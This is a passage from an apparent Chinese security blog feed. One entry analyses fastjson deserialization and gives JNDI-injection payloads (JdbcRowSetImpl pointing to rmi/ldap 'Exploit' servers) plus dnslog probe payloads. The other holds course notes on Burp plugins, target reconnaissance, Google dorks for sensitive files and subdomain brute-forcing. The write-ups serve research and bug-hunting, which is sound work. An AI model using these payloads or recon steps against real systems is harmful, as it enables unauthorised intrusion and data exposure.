class="string">"_outputProperties"</span>:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="再窥Payload"><a href="#再窥Payload" class="headerlink" title="再窥Payload"></a>再窥Payload</h2><p>&emsp;&emsp; 观察发现这个payload由三部分组成，<code>@type</code>、<code>dataSourceName</code>、<code>autoCommint</code>。第一个<code>@type</code>前面已经提及了是获取实例化类，<code>dataSourceName</code>和<code>autoCommit</code>我们看看官方文档。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">              <span class="string">"\"dataSourceName\":\"rmi://localhost:1090/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 大致意思：使用该方法的名称绑定到<code>JNDI命名服务</code>中的<code>DataSource</code>对象上，应用程序就可以使用该名称进行查找，检索绑定到它的DataSource对象。<br><img src="https://img-blog.csdnimg.cn/20200720140337267.png" alt="在这里插入图片描述">&emsp;&emsp; 设置<code>AutoCommit</code>后，会<code>自动提交内容</code>。设置这个属性之后，JNDI找到对应资源，对自动提交内容，读者后期可以试试删除这个属性是不会触发漏洞的。<br><img src="https://img-blog.csdnimg.cn/20200720140401249.png" alt="在这里插入图片描述"><br><strong>知道上面这些特性后，根据特点构造等价代码</strong><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">国外介绍JdbcRowSet 使用方法的一个小案例，可以参考一下。</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://127.0.0.1:1389/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">            throwables.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h1><p>&emsp;&emsp; JSON#parse()方法会调用<code>DefaultJSONParser#parse()</code>，在实例化DefaultJSONParser类是会将输入数据使用实例化JSONScanner类传入，并同时传入默认缺省配置<code>features</code>。<br><img src="https://img-blog.csdnimg.cn/20200720150738738.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720150903703.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 这个 lexer 属性实际上是在 DefaultJSONParser 对象被实例化的时候创建的。<br><img src="https://img-blog.csdnimg.cn/20200720151203563.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser在实例化时会读取当前字符<code>ch={</code>，所以<code>lexer.token()=12</code>。<br><img src="https://img-blog.csdnimg.cn/20200720151810322.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2020072015182461.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 跳转12会创建JSONObject类对象，然后再调用 <code>DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>方法去解析。<br><img src="https://img-blog.csdnimg.cn/2020072015285868.png" alt="在这里插入图片描述"><br>&emsp;&emsp; DefaultJSONParser#parseObject前面会做一个简单判断<code>lexer.token()</code>，然后读取字符判断是否<code>ch==&#39;&quot;&#39;</code>，TRUE就获取其中的字段的值<code>@type</code>并紧接着判断<code>key == JSON.DEFAULT_TYPE_KEY</code>相等。<br><img src="https://img-blog.csdnimg.cn/20200720153408265.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720170453343.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720171815712.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 接下去进入反序列化阶段<code>deserializer#deserialze()</code>–&gt;<code>parseRest()</code>–&gt;<code>fieldDeser#setValue</code>–&gt;一系列反射调用–&gt;<code>JdbcRowSetImpl#setAutoCommit()</code>触发漏洞。</p><p><img src="https://img-blog.csdnimg.cn/20200720173838924.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174044552.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174142800.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174203729.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200720174332739.png" alt="在这里插入图片描述"><br><strong>最后得到Gadget chain如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gadget chain:</span></span><br><span class="line"><span class="comment"> *      JSON.parse()</span></span><br><span class="line"><span class="comment"> *          DefaultJSONParser.parse()</span></span><br><span class="line"><span class="comment"> *              DefaultJSONParser.parseObject()</span></span><br><span class="line"><span class="comment"> *                  JavaBeanDeserializer.deserialze()</span></span><br><span class="line"><span class="comment"> *                      JavaBeanDeserializer.parseRest()</span></span><br><span class="line"><span class="comment"> *                          FieldDeserializer.setValue()</span></span><br><span class="line"><span class="comment"> *                              Reflect.invoke()</span></span><br><span class="line"><span class="comment"> *                                  JdbcRowSetImpl.setAutoCommit()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200720185616310.png" alt="在这里插入图片描述"></p><hr><h1 id="DNSLOG的一个小点"><a href="#DNSLOG的一个小点" class="headerlink" title="DNSLOG的一个小点"></a>DNSLOG的一个小点</h1><p>&emsp;&emsp; 实战挖掘fastjson漏洞的时候比较常用的方法，探测Fastjson是用dnslog方式，探测到了再用RCE Payload去一个一个打。但是本人在本地环境测试的时候发现了几个不同点，fastjson的版本不同，不同的payload成功概率是不同的。至于为什么是这样子，可以参考一下这篇<a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">通过dnslog探测fastjson的几种方法</a>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目前最新版1.2.72版本可以使用1.2.36 &lt; fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload = <span class="string">"&#123;&#123;\"@type\":\"java.net.URL\",\"val\""</span> +</span><br><span class="line">        <span class="string">":\"http://9s1euv.dnslog.cn\"&#125;:\"summer\"&#125;"</span>;</span><br><span class="line"><span class="comment">// 全版本支持 fastjson &lt;= 1.2.72</span></span><br><span class="line">String payload1 = <span class="string">"&#123;\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br><span class="line">String payload2 = <span class="string">"&#123;\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"&#125;"</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.b1ue.cn/archives/184.html" target="_blank" rel="noopener">http://www.b1ue.cn/archives/184.html</a><br><a href="http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html" target="_blank" rel="noopener">http://www.herongyang.com/JDBC/MySQL-JdbcRowSet-DataSource.html</a><br><a href="https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E17824_01/dsc_docs/docs/jscreator/apis/rowset/com/sun/rowset/JdbcRowSetImpl.html</a><br><a href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/" target="_blank" rel="noopener">http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</a><br><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Fastjson这款国内知名的解析json的组件，笔者在此就不多介绍，网络上有很多分析学习fastjson反序列化
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化 Java" scheme="https://summersec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Java/"/>
    
  </entry>
  
  <entry>
    <title>JDSRC安全课笔记</title>
    <link href="https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/"/>
    <id>https://summersec.github.io/2020/07/20/JSRC%E5%AE%89%E5%85%A8%E8%AF%BE%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-20T11:01:42.000Z</published>
    <updated>2020-07-20T11:21:37.792Z</updated>
    
    <content type="html"><![CDATA[<p>﻿# 第一期</p><h2 id="逻辑漏洞挖掘"><a href="#逻辑漏洞挖掘" class="headerlink" title="逻辑漏洞挖掘"></a>逻辑漏洞挖掘</h2><p>&emsp;&emsp; 逻辑漏洞中的认证缺失和认证缺陷漏洞，主要指功能级访问控制缺失，出现任意增删改查用户信息的情况。实际业务场景中，这类漏洞大概两个成因，上线前没有做好认证处理，或权限环节控制不到位。基于工具开发，我们可以通过域名信息收集、站点信息爬取、规则的分析与提取，以及批量处理结果分析与展示四个环节快速发现认证缺失漏洞和认证缺陷漏洞。</p><h1 id="第二期"><a href="#第二期" class="headerlink" title="第二期"></a>第二期</h1><h2 id="基于-burpsuite的web逻辑漏洞插件开发"><a href="#基于-burpsuite的web逻辑漏洞插件开发" class="headerlink" title="基于 burpsuite的web逻辑漏洞插件开发"></a>基于 burpsuite的web逻辑漏洞插件开发</h2><p>Burp Suite作为web应用程序渗透测试集成平台,常被用来进行网站渗透测试。BurpSuite 提供了插件开发接口，支持Java、Python、Ruby语言的扩展。虽然 BApp Store 上面已经提供了很多插件，其中也不乏优秀好用的插件，（推荐几个个人感觉好的插件）CO2,Logger++,Autorize,XSS Validator。但是通用化的工具无法完全符合web安全测试人员的特定需求。</p><p>1、为什么要独立开发插件<br>2、开发环境配置说明；<br>3、插件开发关键接口的使用实例；<br>4、逻辑漏洞检测插件开发探讨；</p><p>1.为什么要独立开发插件<br>随着厂商安全意识增强，传输过程中，大多数线上业务通过https传输，传输流量加密。无法做中间人攻击了就，服务端，数据库中的敏感数据加密存储，访问控制受限，即使拿到数据库也无法拿到明文数据。但是数据在客户端最终要展示给用户，必然明文展现。传统的安全防御设备和措施对逻辑漏洞收效甚微，现在攻击者更倾向于在客户端利用此类漏洞。而逻辑漏洞种类很多，通用化的工具无法完全符合web安全测试人员的特定需求。一个业务的逻辑漏洞抽象出来的模型，难以在其他业务层进行批量处理，通用的解决方案往往效果不佳。但是一个业务层抽象出来的模型，在其自身站点往往具有通用性。例如，某URL存在越权，可能该站点其他URL也可能存在类似的问题。我们基于该URL特征，开发burpsuite插件，批量扫描该站点，就能更全面的发现同类问题。因此，我们有必要根据自己的业务需求，自己能够独立开发插件。</p><p>2.开发环境配置<br>Burp支持Java、Python、Ruby语言的扩展，本次讲座以python环境为 例进行说明。Burpsuite 是运行在java环境，所有的库是java所写。Python作为开发语言，调用Java库就要用到Jython。</p><p>以MacOS为 例子进行说明：<br>brew install jython，就可以了，Burpsuite Jython环境的配置：Extender -&gt; options -&gt; python Environment -&gt; select file,导入下载好的jython jar包。<img src="https://img-blog.csdnimg.cn/20200207154012356.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3.：插件开发关键接口的使用实例，重点讲几个接口</p><p>API接口查阅可以从以下拿到：<br>API接口文档可以在burpsuite 的Extender -&gt; APIs<br>也可以通过<a href="https://portswigger.net/burp/extender/api/index.html进行查阅。" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html进行查阅。</a><br>IBurpExtender<br>IBurpExtender是Burpsuite插件的入口，所有插件的开发都必须要实现。<br>当插件被建立以后，registerExtenderCallbacks也需要实现。<br>代码如下：class BurpExtender(IBurpExtender):<br>def registerExtenderCallbacks(self, callbacks):<br>参数callbacks可获取核心基础库,例如日志，请求，返回值修改等。<br>IExtensionHelpers:<br>提供了编写扩展中常用的一些通用函数，比如编解码、构造请求、获取请求参数，获取请求头等。如：IRequestInfo analyzeRequest(byte[] request)<br>通过analyzeRequest函数，可以拿到请求的细节。<br>通过如下几个接口方法可以拿到。<br><img src="https://img-blog.csdnimg.cn/20200207154237626.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>IHttpRequestResponse: 这个接口包含了每个请求和响应的细节。在Brupsuite中的每个请求或者响应都是IHttpRequestResponse实例。通过getRequest()， getResponse()方法可以获取请求和响应的细节信息。</p><p>以registerHttpListener为例进行代码说明：</p><p><img src="https://img-blog.csdnimg.cn/2020020715432066.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如图所示，在user 和 webserver之间建立监听，调用HttpListener接口。获取请求，响应的日志。<br>实现这个功能，最重要的是这个方法：    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">register ourselves as an HTTP listener callbacks.registerHttpListener(self)</span><br><span class="line">    def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        ## 设置插件名</span><br><span class="line">        self._callbacks.setExtensionName(&quot;getTheRequest&quot;)</span><br></pre></td></tr></table></figure><pre><code> # //如果没有注册，下面的processHttpMessage方法是不会生效的。处理请求和响应包的插件，这个应该是必要的   callbacks.registerHttpListener(self)### processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)，### 在messageInfo这个参数中，我们可以获取到request和response日志。</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">processHttpMessage</span><span class="params">(self, toolFlag, messageIsRequest, messageInfo)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> toolFlag == <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">                request = messageInfo.getRequest()</span><br><span class="line">                analyzedRequest = self._helpers.analyzeResponse(request)</span><br><span class="line">                request_header = analyzedRequest.getHeaders()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    method, path = res_path.findall(request_header[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    host = res_host.findall(request_header[<span class="number">1</span>])[<span class="number">0</span>]</span><br><span class="line">                    url = method + <span class="string">" "</span> + host + path</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    url = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> method == <span class="string">"GET"</span>:</span><br><span class="line">                    <span class="keyword">print</span> “[+++++]The URL <span class="keyword">is</span> <span class="string">", url</span></span><br><span class="line"><span class="string">                    print "</span>[+++++]The host <span class="keyword">is</span> <span class="string">",host</span></span><br><span class="line"><span class="string">                    print "</span>[++++] The URI <span class="keyword">is</span> following<span class="string">"</span></span><br><span class="line"><span class="string">                    print path</span></span><br><span class="line"><span class="string">                    for iterm in path.split("</span>/<span class="string">"):</span></span><br><span class="line"><span class="string">                        print iterm</span></span><br><span class="line"><span class="string">                    print "</span>======================================================================================<span class="string">"</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p><code>代码如上所示，就可以打印出URL，HOST，URI日志信息</code><br><img src="https://img-blog.csdnimg.cn/20200207154729683.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一个demo。延伸一下，我们在做渗透测试的过程中，往往苦于目录字典不全，我们将这个URI生成目录字典，为目录爆破做准备。</p><hr><p>如果做扫描类插件：<br>class BurpExtender(IBurpExtender,IScannerCheck)<br>callbacks.registerScannerCheck(this);<br>实现IScannerCheck后需要重写被动扫描的函数。<br>doPassiveScan(IHttpRequestResponse baseRequestResponse) {}<br>doPassiveScan这个接口，在baseRequestResponse获取请求和响应数据，并利用这些数据进行基于扫描规则进行扫描。</p><h1 id="第四期-SRC挖掘"><a href="#第四期-SRC挖掘" class="headerlink" title="第四期 SRC挖掘"></a>第四期 SRC挖掘</h1><p>首先将公司架构吧，我们就以京东为例吧</p><p>企业的组织架构信息可通过开源信息获取。<br>常用的方法，通过维基百科，百度百科等确定企业的大体组织架构；<br>zh.wikipedia.org<br>baike.baidu.com</p><p><img src="https://img-blog.csdnimg.cn/20200306154856499.jpg" alt="在这里插入图片描述">结合以下站点信息，进一步确定企业组织架构：<br>国家企业信用公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a><br>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></p><p>公司架构确定完成后，我们开始被动信息的收集</p><p>被动信息收集是指不与目标直接交互，通过公开的渠道获取获取目标信息。<br>可从以下几点展开，DNS信息收集，https证书信息，搜索引擎，网络空间安全搜索引擎，基于备案资料信息收集。</p><p>DNS信息收集<br>通过目标站点的域名注册信息，如whois日志进行信息关联。</p><p>国外常用的whois查询站点：<br><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br><a href="https://whois.cymru.com/cgi-bin/whois.cgi" target="_blank" rel="noopener">https://whois.cymru.com/cgi-bin/whois.cgi</a><br><a href="https://whois.arin.net/ui/query.do" target="_blank" rel="noopener">https://whois.arin.net/ui/query.do</a></p><p>国内常用的whois查询站点：<br>[图片]<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a></p><p>通过whois查询确定注册者，然后关联同一注册者的其他站点信息。</p><p><a href="https://viewdns.info/reversewhois/?q=email@111.com" target="_blank" rel="noopener">https://viewdns.info/reversewhois/?q=email@111.com</a><br><a href="https://whois.chinaz.com/reverse?ddlSearchMode=2" target="_blank" rel="noopener">https://whois.chinaz.com/reverse?ddlSearchMode=2</a></p><p>https证书信息，即通过https证书进行信息收集，可通过采用以下几种方式</p><p>基于证书透明度两个站点：<br><a href="https://certspotter.com/api/v0/certs" target="_blank" rel="noopener">https://certspotter.com/api/v0/certs</a><br><a href="https://crt.sh" target="_blank" rel="noopener">https://crt.sh</a></p><p>为方便信息处理，可编写脚本处理：<br>crtFetch -d example.com</p><p><img src="https://img-blog.csdnimg.cn/2020030615473366.jpg" alt="在这里插入图片描述"><br>我们看到就可以梳理出一部分子域名信息了<br>脚本位置：<a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/crtFetch.py</a></p><p>该脚本对在线站点获取的域名进行清洗，可获取到单域名SSL证书和通配符SSL证书两类。</p><p>有时候我们可能忽略的地方，有些企业的https证书中的相关域名可在浏览器证书中点击查看；</p><p><img src="https://img-blog.csdnimg.cn/20200306154605875.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200306154625356.jpg" alt="在这里插入图片描述"></p><p>基于goolge hack技术可以查询到很多敏感信息。<br>更详细的用法可在这里查询：<br><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a></p><p>我们常用关键字查询：<br>site：搜索域名的范围<br>inurl：URL格式<br>intitle：搜索的网页标题<br>intext：搜索包含其中文字的网页<br>filetype：搜索文件的后缀或者扩展名<br>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>link：搜索某个网站的链接<br>info：查找指定站点的一些基本信息</p><h2 id="【查找敏感文件】"><a href="#【查找敏感文件】" class="headerlink" title="【查找敏感文件】"></a>【查找敏感文件】</h2><p>site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite)</p><h2 id="【查找敏感目录地址】"><a href="#【查找敏感目录地址】" class="headerlink" title="【查找敏感目录地址】"></a>【查找敏感目录地址】</h2><p>site:xxx.com inurl:login|admin|manage|admin_login|system|user|auth|dev|test<br>site:xxx.com intitle:后台|管理|内部|登录|系统</p><p>以下可能是我们会忽略的几个关键字查询语句：</p><h3 id="基于备案号，copyright信息查询"><a href="#基于备案号，copyright信息查询" class="headerlink" title="基于备案号，copyright信息查询"></a>基于备案号，copyright信息查询</h3><p>intext:”Tesla © 2020”<br>intext:”京ICP备11041704号-15”</p><h2 id="可以正则的形式"><a href="#可以正则的形式" class="headerlink" title="可以正则的形式"></a>可以正则的形式</h2><p>site:dev.<em>.</em>/signin<br>site:<em>/recover-pass<br>site:smtp.</em>.<em>/login<br>site:/com:</em><br>site:/216.75.<em>.</em></p><p>##基于端口或者端口范围查询<br>site:/com:8443/<br>site:/com:* 8000…9000</p><p>查询到的关键词，利用备案信息可以大致确定各个站点的域名信息。</p><p><img src="https://img-blog.csdnimg.cn/20200306155039691.jpg" alt="在这里插入图片描述"><br>curl <a href="http://www.beianbeian.com/search-1/example.html" target="_blank" rel="noopener">http://www.beianbeian.com/search-1/example.html</a> | grep “<br>“ |  grep -o “www.\w<em>.\w</em>“ | sort | uniq |sed “s/www.//g”</p><p><img src="https://img-blog.csdnimg.cn/20200306155121441.png" alt="在这里插入图片描述"></p><p>不断的根据网络备案/许可证号进行反查，即可梳理更多的资产信息。<br>确定企业的IP段，可基于<a href="https://bgp.he.net/站点进行收集。" target="_blank" rel="noopener">https://bgp.he.net/站点进行收集。</a><br>输入公司名称可查询该公司的IP资产信息，然后正则匹配IP段：<br>cat aa.txt| grep -Eo “&lt;td&gt;.<em>?td&gt;“| grep “href”| grep -Eo “([0-9]{1,3}[.]){3}[0-9]{1,3}/</em>[0-9]{0,2}”</p><h2 id="微信公共号"><a href="#微信公共号" class="headerlink" title="微信公共号"></a>微信公共号</h2><p>基于公众号信息，我们可以挖掘到很多的厂商业务信息。公司的公众号信息可在sogou搜索引擎可以进行查询。<br><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C" target="_blank" rel="noopener">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E4%BA%AC%E4%B8%9C</a><br>为便于快速梳理，可用脚本处理。<br>python gongzhonghao.py -d “目标公司”<br><a href="https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py" target="_blank" rel="noopener">https://github.com/3stoneBrother/personalTools/blob/master/scripts/gongzhonghao.py</a></p><p><img src="https://img-blog.csdnimg.cn/20200306155403699.jpg" alt="在这里插入图片描述"><br>这就得到某公司的所有公众号信息</p><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>通过被动信息收集到一批域名，IP信息。以主动信息比较容易忽略的三级域名，甚至四级域名为例进行说明。通配符SSL证书往往是三级、四级域名高效爆破的目标，为批量处理，在crtFetch脚本中提取了需要进一步爆破的三级、四级域名。</p><p>然后进行域名爆破，爆破工具有很多，以gobuster为例进行演示：<br>gobuster dns -t 30 -w  sub_name.txt -i  -q –wildcard -d api.example.com| tee  domains-active.txt</p><p><img src="https://img-blog.csdnimg.cn/20200306155621157.png" alt="在这里插入图片描述"><br>这些三级四级域名，防护往往会薄弱一些</p><p>域名是否存活可利用httprobe工具确定。<br>cat domain.txt | httprobe &gt; domain-alive.txt </p><p><img src="https://img-blog.csdnimg.cn/20200306155753708.png" alt="在这里插入图片描述"><br>也可通过whatweb查看链接的服务器版本，标题等信息，处理结果如下图所示<br><img src="https://img-blog.csdnimg.cn/20200306155835844.png" alt="在这里插入图片描述"><br>为便于批量查看URL内容，我们可通过屏幕截图工具webscreenshot进行处理。<br>具体方法如下：首先将存活的站点截图到screenshots文件夹下面：<br>webscreenshot -i alive.txt -o screenshots -w 20 -m -a “X-FORWARDED-FOR:127.0.0.1”<br>为便于浏览，我们将截图生成一个html文件便于在浏览器查看：<br>for I in $(ls -S); do echo “$I” &gt;&gt; index.html；echo “&lt;\ img src=$I&gt;&lt;br&gt;” &gt;&gt; index.html； done<br>在浏览器中打开 index.html文件，就可看到所有的网页截图了。效果如下图，所有存活站点都在一个页面展现出来。可根据站点内容做进一步的渗透测试。</p><hr><h1 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h1><p>&emsp;&emsp; 在企业级应用开发中，经常会遇到跨域数据交互的问题，例如多个子集应用之间通过跨域获取用户登录状态及身份信息等，从而能够满足现代web应用中的实际需求。因此谈到跨域就要了解下浏览器的同源策略。<br>&emsp;&emsp; 浏览器的同源策略（Same Origin Policy,SOP）,同源要求两个页面具有相同的协议、域名、端口号。当A应用(<a href="https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口" target="_blank" rel="noopener">https://www.a.com)想请求B应用(https://www.b.com)里面的某个接口</a>(提交操作）或者读取接口返回的数据作进一步的处理的话，这时就需要考虑跨域问题了，一般情况下浏览器会阻止这种不安全的跨域行为。但在html语言中，有些标签是具备天然的跨域功能的，比如&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;等标签是可以直接跨域请求其它域的资源的，这就催生了JSONP(JSON with Padding)，JSONP本质上是利用了&lt;script&gt;标签的跨域能力。</p><h2 id="JSONP跨域安全开发实践方面"><a href="#JSONP跨域安全开发实践方面" class="headerlink" title="JSONP跨域安全开发实践方面"></a>JSONP跨域安全开发实践方面</h2><p>a.com 想要跨域读取b.com下的/getinfo的返回数据，a.com前端示例代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_callback</span><span class="params">(msg)</span></span>&#123;      </span><br><span class="line"> <span class="keyword">do</span> something();<span class="comment">//回调函数，自定义读取数据后续操作    </span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src =<span class="string">"http://b.com/getinfo?callback=jsonp_callback"</span> type=<span class="string">"text/javascript"</span> &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>b.com后台示例代码如下 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=<span class="string">"/getinfo"</span>,method=RequestMethod.GET)</span><br><span class="line">@ResponseBody</span><br><span class="line"><span class="keyword">public</span> String getToken(@RequestParam(<span class="string">"callback"</span>) String callbackFunction)&#123;  </span><br><span class="line"><span class="keyword">return</span> callbackFunction+<span class="string">"&#123;\"result\":&#123;\"data\":&#123;\"token\":\"18623163885dedec5decbab1.37745340\"&#125;&#125;&#125;;"</span>;</span><br><span class="line">    